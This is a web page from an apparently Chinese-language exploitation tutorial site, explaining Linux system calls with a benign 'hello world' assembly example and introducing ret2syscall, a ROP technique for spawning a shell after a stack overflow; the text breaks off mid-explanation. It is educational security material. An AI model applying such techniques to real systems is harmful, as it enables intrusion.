<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://c3n1gbr0k3n.github.io/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://c3n1gbr0k3n.github.io/fonts/vendor/jost/jost-v4-latin-500.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://c3n1gbr0k3n.github.io/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><link rel=stylesheet href=https://c3n1gbr0k3n.github.io/main.7875e1eb2957d73aae7bd3e144cdd5be1c5ea14856a728b76590d80b0d77055d21126cf03dc75066214418f02e41983bc5169688d453dcde43cd821250a13770.css integrity="sha512-eHXh6ylX1zque9PhRM3VvhxeoUhWpyi3ZZDYCw13BV0hEmzwPcdQZiFEGPAuQZg7xRaWiNRT3N5DzYISUKE3cA==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>ret2syscall - BinaryMusings</title><meta name=description content="0x01 介绍 # 系统调用 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
我们可以看一下32位的系统调用号
前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
char *buf = &amp;quot;hello world\n&amp;quot;; void main(); asm( &amp;quot;.text\n&amp;quot; &amp;quot;.global main\n&amp;quot; &amp;quot;main:\n&amp;quot; // write(1, &amp;quot;hello world\n&amp;quot;, 12) &amp;quot;mov ebx, 1\n&amp;quot; // 第一个参数，标准输出流 &amp;quot;mov ecx, buf\n&amp;quot; // 第二个参数，字符串地址 &amp;quot;mov edx, 12\n&amp;quot; // 第三个参数，输出字节数 &amp;quot;mov eax, 4\n&amp;quot; // write的系统调用号 &amp;quot;int 0x80\n&amp;quot; // 内陷指令 ); // gcc test.c -o test -m32 -masm=intel 运行效果为"><link rel=canonical href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="ret2syscall"><meta property="og:description" content="0x01 介绍 # 系统调用 # syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 int 0x80 指令来执行系统调用，而64位程序则是通过 syscall 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 /usr/include/asm/unistd.h 找到32位和64位的系统调用号分别存储的文件
我们可以看一下32位的系统调用号
前部分是系统调用名称，比如 __NR_read 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 3 就是read的系统调用号0。64位的系统调用号也是同理。
当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 ebx、ecx、edx、esi、edi ，对于64位来说顺序为 rdi、rsi、rdx、rcx、r8、r9 。我们以内联汇编的形式来实现一个简单的系统调用
char *buf = &#34;hello world\n&#34;; void main(); asm( &#34;.text\n&#34; &#34;.global main\n&#34; &#34;main:\n&#34; // write(1, &#34;hello world\n&#34;, 12) &#34;mov ebx, 1\n&#34; // 第一个参数，标准输出流 &#34;mov ecx, buf\n&#34; // 第二个参数，字符串地址 &#34;mov edx, 12\n&#34; // 第三个参数，输出字节数 &#34;mov eax, 4\n&#34; // write的系统调用号 &#34;int 0x80\n&#34; // 内陷指令 ); // gcc test.c -o test -m32 -masm=intel 运行效果为"><meta property="og:url" content="https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/"><meta property="og:site_name" content="BinaryMusings"><meta property="article:published_time" content="2023-03-28T21:07:32+08:00"><meta property="article:modified_time" content="2023-03-28T21:07:32+08:00"><meta property="og:image" content="https://c3n1gbr0k3n.github.io/doks.png"><meta property="og:image:alt" content="BinaryMusings"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@getdoks"><meta name=twitter:creator content="@henkverlinde"><meta name=twitter:title content="ret2syscall"><meta name=twitter:description content><meta name=twitter:image content="https://c3n1gbr0k3n.github.io/doks.png"><meta name=twitter:image:alt content="ret2syscall"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://c3n1gbr0k3n.github.io/#/schema/organization/1","name":"Doks","url":"https://c3n1gbr0k3n.github.io/","sameAs":["https://twitter.com/getdoks","https://github.com/h-enk/doks"],"logo":{"@type":"ImageObject","@id":"https://c3n1gbr0k3n.github.io/#/schema/image/1","url":"https://c3n1gbr0k3n.github.io/logo-doks.png","width":512,"height":512,"caption":"Doks"},"image":{"@id":"https://c3n1gbr0k3n.github.io/#/schema/image/1"}},{"@type":"WebSite","@id":"https://c3n1gbr0k3n.github.io/#/schema/website/1","url":"https://c3n1gbr0k3n.github.io/","name":"BinaryMusings","description":"二进制随想录，分享与开放","publisher":{"@id":"https://c3n1gbr0k3n.github.io/#/schema/organization/1"}},{"@type":"WebPage","@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/","url":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/","name":"ret2syscall","description":"","isPartOf":{"@id":"https://c3n1gbr0k3n.github.io/#/schema/website/1"},"about":{"@id":"https://c3n1gbr0k3n.github.io/#/schema/organization/1"},"datePublished":"2023-03-28T21:07:32CET","dateModified":"2023-03-28T21:07:32CET","breadcrumb":{"@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/#/schema/breadcrumb/1"},"primaryImageOfPage":{"@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/#/schema/image/2"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/"]}]},{"@type":"BreadcrumbList","@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/#/schema/breadcrumb/1","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://c3n1gbr0k3n.github.io/","url":"https://c3n1gbr0k3n.github.io/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://c3n1gbr0k3n.github.io/docs/","url":"https://c3n1gbr0k3n.github.io/docs/","name":"Docs"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"https://c3n1gbr0k3n.github.io/docs/exploit/","url":"https://c3n1gbr0k3n.github.io/docs/exploit/","name":"Exploit"}},{"@type":"ListItem","position":4,"item":{"@type":"WebPage","@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/","url":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/","name":"Stackoverflow"}},{"@type":"ListItem","position":5,"item":{"@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://c3n1gbr0k3n.github.io/#/schema/article/1","headline":"ret2syscall","description":"","isPartOf":{"@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/"},"mainEntityOfPage":{"@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/"},"datePublished":"2023-03-28T21:07:32CET","dateModified":"2023-03-28T21:07:32CET","author":{"@id":"https://c3n1gbr0k3n.github.io/#/schema/person/2"},"publisher":{"@id":"https://c3n1gbr0k3n.github.io/#/schema/organization/1"},"image":{"@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/#/schema/image/2"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Person","@id":"https://c3n1gbr0k3n.github.io/#/schema/person/2","name":"Henk Verlinde","sameAs":["https://twitter.com/henkverlinde","https://www.linkedin.com/in/henkverlinde/","https://github.com/h-enk"]}]},{"@context":"https://schema.org","@graph":[{"@type":"ImageObject","@id":"https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/#/schema/image/2","url":"https://c3n1gbr0k3n.github.io/doks.png","contentUrl":"https://c3n1gbr0k3n.github.io/doks.png","caption":"ret2syscall"}]}]}</script><meta name=theme-color content="#fff"><link rel=icon href=https://c3n1gbr0k3n.github.io/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=https://c3n1gbr0k3n.github.io/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=https://c3n1gbr0k3n.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://c3n1gbr0k3n.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://c3n1gbr0k3n.github.io/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=https://c3n1gbr0k3n.github.io/site.webmanifest></head><body class="docs single"><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg navbar-light doks-navbar"><nav class="container-xxl flex-wrap flex-lg-nowrap" aria-label="Main navigation"><a class="navbar-brand order-0" href=https://c3n1gbr0k3n.github.io/ aria-label=BinaryMusings>BinaryMusings</a>
<button class="btn btn-link order-0 ms-auto d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasExample aria-controls=offcanvasExample><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-more-horizontal"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasExample aria-labelledby=offcanvasExampleLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasExampleLabel>Browse docs</h5><button type=button class=btn-close data-bs-dismiss=offcanvas aria-label=Close></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-a9963513d093ffb2bc7ceb9807771ad4 aria-expanded=true>
Exploit</button><div class="collapse show" id=section-a9963513d093ffb2bc7ceb9807771ad4><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-84d7dc19766c446f5e4084e8fce87f82 aria-expanded=true>
StackOverflow</button><div class="collapse show" id=section-84d7dc19766c446f5e4084e8fce87f82><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2text/>ret2text</a></li><li><a class="docs-link rounded active" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/>ret2syscall</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2shellcode/>ret2shellcode</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2libc/>ret2libc</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/stack_pivoting/>栈迁移</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/canary_blast/>Canary爆破</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d34e003af75d72b00bc986ca8a2b82c7 aria-expanded=false>
FormatString</button><div class=collapse id=section-d34e003af75d72b00bc986ca8a2b82c7><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/formatstring/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/>格式化字符串漏洞</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/formatstring/%E5%85%A8%E5%B1%80%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99/>全局格式化字符串任意写</a></li></ul></div></li></ul></div></li></ul></nav></aside></div></div><button class="btn btn-menu order-2 d-block d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasDoks aria-controls=offcanvasDoks aria-label="Open main menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><div class="offcanvas offcanvas-end border-0 py-lg-1" tabindex=-1 id=offcanvasDoks data-bs-backdrop=true aria-labelledby=offcanvasDoksLabel><div class="header-bar d-lg-none"></div><div class="offcanvas-header d-lg-none"><h2 class="h5 offcanvas-title ps-2" id=offcanvasDoksLabel><a class=text-dark href=https://c3n1gbr0k3n.github.io/>BinaryMusings</a></h2><button type=button class="btn-close text-reset me-2" data-bs-dismiss=offcanvas aria-label="Close main menu"></button></div><div class="offcanvas-body p-4 p-lg-0"><ul class="nav flex-column flex-lg-row align-items-lg-center mt-2 mt-lg-0 ms-lg-2 me-lg-auto"><li class=nav-item><a class="nav-link ps-0 py-1 active" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2text>Docs</a></li><li class=nav-item><a class="nav-link ps-0 py-1" href=https://c3n1gbr0k3n.github.io/writeup/buuoj/warmup_csaw_2016>WriteUp</a></li><li class=nav-item><a class="nav-link ps-0 py-1" href=https://c3n1gbr0k3n.github.io/blog/>Blog</a></li></ul><hr class="text-black-50 my-4 d-lg-none"><form class="doks-search position-relative flex-grow-1 ms-lg-auto me-lg-2"><input id=search class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded d-none"></div></form><hr class="text-black-50 my-4 d-lg-none"><ul class="nav flex-column flex-lg-row"><li class=nav-item><a class="nav-link social-link" href=https://github.com/c3n1gbr0k3n/BinaryMusings><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><small class="ms-2 d-lg-none">GitHub</small></a></li></ul><hr class="text-black-50 my-4 d-lg-none"><button id=mode class="btn btn-link" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></div></div></nav></header></div><div class=container-xxl><aside class=doks-sidebar><nav id=doks-docs-nav class="collapse d-lg-none" aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-a9963513d093ffb2bc7ceb9807771ad4 aria-expanded=true>
Exploit</button><div class="collapse show" id=section-a9963513d093ffb2bc7ceb9807771ad4><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-84d7dc19766c446f5e4084e8fce87f82 aria-expanded=true>
StackOverflow</button><div class="collapse show" id=section-84d7dc19766c446f5e4084e8fce87f82><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2text/>ret2text</a></li><li><a class="docs-link rounded active" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/>ret2syscall</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2shellcode/>ret2shellcode</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2libc/>ret2libc</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/stack_pivoting/>栈迁移</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/canary_blast/>Canary爆破</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d34e003af75d72b00bc986ca8a2b82c7 aria-expanded=false>
FormatString</button><div class=collapse id=section-d34e003af75d72b00bc986ca8a2b82c7><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/formatstring/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/>格式化字符串漏洞</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/formatstring/%E5%85%A8%E5%B1%80%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99/>全局格式化字符串任意写</a></li></ul></div></li></ul></div></li></ul></nav></aside></div><div class="wrap container-xxl" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-a9963513d093ffb2bc7ceb9807771ad4 aria-expanded=true>
Exploit</button><div class="collapse show" id=section-a9963513d093ffb2bc7ceb9807771ad4><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-84d7dc19766c446f5e4084e8fce87f82 aria-expanded=true>
StackOverflow</button><div class="collapse show" id=section-84d7dc19766c446f5e4084e8fce87f82><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2text/>ret2text</a></li><li><a class="docs-link rounded active" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2syscall/>ret2syscall</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2shellcode/>ret2shellcode</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/ret2libc/>ret2libc</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/stack_pivoting/>栈迁移</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/stackoverflow/canary_blast/>Canary爆破</a></li></ul></div></li><li class="my-1 ms-3"><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-d34e003af75d72b00bc986ca8a2b82c7 aria-expanded=false>
FormatString</button><div class=collapse id=section-d34e003af75d72b00bc986ca8a2b82c7><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/formatstring/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/>格式化字符串漏洞</a></li><li><a class="docs-link rounded" href=https://c3n1gbr0k3n.github.io/docs/exploit/formatstring/%E5%85%A8%E5%B1%80%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99/>全局格式化字符串任意写</a></li></ul></div></li></ul></div></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=d-xl-none><button class="btn btn-outline-primary btn-sm doks-toc-toggle collapsed" type=button data-bs-toggle=collapse data-bs-target=#onThisPage aria-controls=doks-docs-nav aria-expanded=false aria-label="Toggle On this page navigation">
<span>On this page</span>
<span><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-expand" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Expand</title><polyline points="7 13 12 18 17 13"/><polyline points="7 6 12 11 17 6"/></svg><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-collapse" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Collapse</title><polyline points="17 11 12 6 7 11"/><polyline points="17 18 12 13 7 18"/></svg></span></button><div class=collapse id=onThisPage><div class="card card-body mt-3 py-1"><div class=page-links><nav id=TableOfContents><ul><li><a href=#0x01-介绍>0x01 介绍</a><ul><li><a href=#系统调用>系统调用</a></li><li><a href=#ret2syscall>ret2syscall</a></li></ul></li></ul></nav></div></div></div></div><div class="page-links d-none d-xl-block"><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#0x01-介绍>0x01 介绍</a><ul><li><a href=#系统调用>系统调用</a></li><li><a href=#ret2syscall>ret2syscall</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><h1>ret2syscall</h1><p class=lead></p><nav class=d-xl-none aria-label="Quaternary navigation"><div class=d-xl-none><button class="btn btn-outline-primary btn-sm doks-toc-toggle collapsed" type=button data-bs-toggle=collapse data-bs-target=#onThisPage aria-controls=doks-docs-nav aria-expanded=false aria-label="Toggle On this page navigation">
<span>On this page</span>
<span><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-expand" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Expand</title><polyline points="7 13 12 18 17 13"/><polyline points="7 6 12 11 17 6"/></svg><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-collapse" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Collapse</title><polyline points="17 11 12 6 7 11"/><polyline points="17 18 12 13 7 18"/></svg></span></button><div class=collapse id=onThisPage><div class="card card-body mt-3 py-1"><div class=page-links><nav id=TableOfContents><ul><li><a href=#0x01-介绍>0x01 介绍</a><ul><li><a href=#系统调用>系统调用</a></li><li><a href=#ret2syscall>ret2syscall</a></li></ul></li></ul></nav></div></div></div></div><div class="page-links d-none d-xl-block"><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#0x01-介绍>0x01 介绍</a><ul><li><a href=#系统调用>系统调用</a></li><li><a href=#ret2syscall>ret2syscall</a></li></ul></li></ul></nav></div></nav><h2 id=0x01-介绍>0x01 介绍 <a href=#0x01-%e4%bb%8b%e7%bb%8d class=anchor aria-hidden=true>#</a></h2><h3 id=系统调用>系统调用 <a href=#%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8 class=anchor aria-hidden=true>#</a></h3><p>syscall又称为系统调用，是操作系统给用户的API接口，可以用来使用电脑资源。首先需要来熟悉系统调用的使用方式，对于32程序来说是通过 <code>int 0x80</code> 指令来执行系统调用，而64位程序则是通过 <code>syscall</code> 指令来执行。在执行命令前，需要把参数和系统调用号准备好，系统调用号是操作系统分配给不同系统调用的一个数字，以便内核区分它们，我们可以在 <code>/usr/include/asm/unistd.h</code> 找到32位和64位的系统调用号分别存储的文件</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/bd451c85c8cfb9e7a7d71f72d4318dcd.png alt=bd451c85c8cfb9e7a7d71f72d4318dcd></p><p>我们可以看一下32位的系统调用号</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/34359385b45288b164e6531b2dc74bcf.png alt=34359385b45288b164e6531b2dc74bcf></p><p>前部分是系统调用名称，比如 <code>__NR_read</code> 就是read系统调用，而后半部分就是系统调用号，都是数字，例如 <code>3</code> 就是read的系统调用号0。64位的系统调用号也是同理。</p><p>当执行内陷指令之前，需要将系统调用号传入ax寄存器中。其次需要在执行内陷指令前要做的就是传递参数给内核，这里不管是32位还是64位的程序都必须用寄存器来传递参数。对于32位来说，参数寄存器的传递顺序是 <code>ebx、ecx、edx、esi、edi</code> ，对于64位来说顺序为 <code>rdi、rsi、rdx、rcx、r8、r9</code> 。我们以内联汇编的形式来实现一个简单的系统调用</p><pre><code class=language-c>char *buf = &quot;hello world\n&quot;;
void main();
asm(
    &quot;.text\n&quot;
    &quot;.global main\n&quot;
    &quot;main:\n&quot;
    // write(1, &quot;hello world\n&quot;, 12)
    &quot;mov ebx, 1\n&quot;    // 第一个参数，标准输出流
    &quot;mov ecx, buf\n&quot;    // 第二个参数，字符串地址
    &quot;mov edx, 12\n&quot;    // 第三个参数，输出字节数
    &quot;mov eax, 4\n&quot;    // write的系统调用号
    &quot;int 0x80\n&quot;    // 内陷指令
);
// gcc test.c -o test -m32 -masm=intel
</code></pre><p>运行效果为</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/c0fa4df1d7b98a107b9db88fc1f73c30.png alt=c0fa4df1d7b98a107b9db88fc1f73c30></p><h3 id=ret2syscall>ret2syscall <a href=#ret2syscall class=anchor aria-hidden=true>#</a></h3><p>而ret2syscall它要完成的就是去调用某个系统调用来完成getshell的操作。ret2syscall作为ROP系列之一，它的核心还是溢出，不过它的难点就在于溢出后的步骤。之前的ret2text是直接返回到程序中已有的getshell代码片段，ret2syscall则没有现成的getshell代码片段出现，它获取shell的方式是通过多个代码片段之间的跳转执行，我们称这多个代码片段组成的类似于链状的执行过程称为ROP链。大概流程如下</p><p><img class="img-fluid lazyload blur-up" src=https://c3n1gbr0k3n.github.io/images/04f861564255fd35278467fc20a8b9d0.png 